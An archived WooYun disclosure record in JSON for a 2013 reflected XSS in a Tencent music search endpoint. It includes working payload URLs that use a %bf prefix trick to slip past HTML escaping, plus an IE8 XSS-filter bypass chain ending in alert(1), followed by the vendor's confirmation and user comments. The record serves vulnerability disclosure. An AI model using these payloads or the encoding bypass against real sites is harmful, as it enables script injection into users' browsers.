{"id": 10701, "wybug_id": "wooyun-2013-027204", "wybug_title": "腾讯一处反射型XSS - 绕过方式比较奇葩", "wybug_corp": "腾讯", "wybug_author": "多多关照", "wybug_date": "2013-06-29 23:59", "wybug_open_date": "2013-08-13 23:59", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-13：\t细节向公众公开  简要描述： 本来是一处非XSS点，但使用有点奇葩的方式就绕过了。 详细说明：  1. 首先是普通情况下：http://soso.music.qq.com/fcgi-bin/cgiSearchKeyWord?w=aaa<script>显然，< 和 >  都被过滤成了 &lt; &gt;2. 看起来这并不是一个XSS点，但是可以像下面这样奇葩的绕过。http://soso.music.qq.com/fcgi-bin/cgiSearchKeyWord?w=aaa%bf<img src%bf%3d1%bf>也就是说，每个字符前面加上 %bf，就不会被过滤，且输出的时候，%bf又没了。3. 进一步，为了绕过IE8的过滤器。结合  WooYun: IE8 xss filter bypass (xss过滤器绕过) \nhttp://soso.music.qq.com/fcgi-bin/cgiSearchKeyWord?w=%bf<div/id%bf%3dx%bf>x%bf</div%bf>%bf<xml:namespace prefix%bf%3dt%bf>%bf<import namespace%bf%3dt implementation%bf%3d%23default%23time2%bf>%bf<t:set/attributename%bf%3dinnerHTML targetElement%bf%3dx to%bf%3d%26lt;img%26%2311;src%bf%3dx:x%26%2311;onerror%26%2311;%bf%3dalert%26%23x28;1%26%23x29;%26gt;%bf>\n   漏洞证明：  xp + ie8\n\n   修复方案：  不知道服务器端的过滤逻辑。   版权声明：转载请注明来源 多多关照@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-07-01 10:00 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-30 00:09 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:69        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  围观    \n     2013-06-30 00:12 |    \t\tnyannyannyan \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 蒟蒻一枚)\t\t \n  神奇的路人甲    \n     2013-06-30 00:18 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  神奇的路人甲     \n     2013-06-30 05:57 |    \t\tB1acken \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:56        | 渣渣)\t\t \n  只要提交漏洞并且在WooYun审核通过就可以获得邀请码，由于只有邀请码的时候才可以注册ID，所以漏洞会以路人甲的身份发布，路人甲是一个公用马甲，包括匿名提交的和没有ID的用户。    \n     2013-06-30 08:11 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  @B1acken 认真你就输了    \n     2013-06-30 09:00 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  @B1acken 认真你就输了    \n     2013-06-30 10:14 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  神奇的路人甲    \n     2013-06-30 12:24 |    \t\t好人 \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:6        | 多少人曾爱慕你年轻的容颜)\t\t \n  。。。。。。。我是路人假    \n     2013-06-30 14:04 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  大牛们，多多关照    \n     2013-06-30 16:46 |    \t\t银冥币 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:21        | \"/upload/avatar/avatar_251_b.jpg\" />)\t\t \n  @gainover 惊现野生二哥一只    \n     2013-07-01 10:14 |    \t\tckaexn \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | ~)\t\t \n  @gainover 二哥登错号了？    \n     2013-07-12 08:49 |    \t\tCnCxzSec(衰仔) \t\t\t( 普通白帽子  |\t\t\t        Rank:322 漏洞数:32        | Wow~~~)\t\t \n  @gainover 二哥哈哈哈哈哈哈哈哈哈哈    \n     2013-07-31 18:17 |    \t\tkarl \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 想要看到别人看不到的真相，那么你只能比别...)\t\t \n  各位前辈，多多关照    \n     2013-08-11 14:31 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  我去，怎么发现的。。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}